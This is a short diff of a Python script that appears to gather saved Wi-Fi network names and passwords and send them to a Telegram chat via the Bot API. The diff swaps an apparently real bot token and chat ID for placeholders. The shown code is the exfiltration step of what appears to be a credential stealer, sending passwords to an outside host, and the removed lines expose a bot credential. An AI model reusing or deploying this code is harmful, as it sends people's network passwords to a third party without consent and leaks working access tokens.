@@ -52,8 +52,8 @@ wifiPassword_escaped = escape_markdown(wifiPassword)
 final_result = f"password for username *{wifiName_escaped}* : ||{wifiPassword_escaped}||"
 
 # Send message to Telegram
-Bot_token = '6989989159:AAGj_44mqExEf6FYEEzECqiItZUYe4uX_4I'
-chat = "6228676277"
+Bot_token = 'YOUR_BOT_TOKEN'
+chat = "YOUR_CHAT_ID"
 
 def send(data):
     requests.get(f"https://api.telegram.org/bot{Bot_token}/sendMessage?chat_id={chat}&text={data}&parse_mode=MarkdownV2")
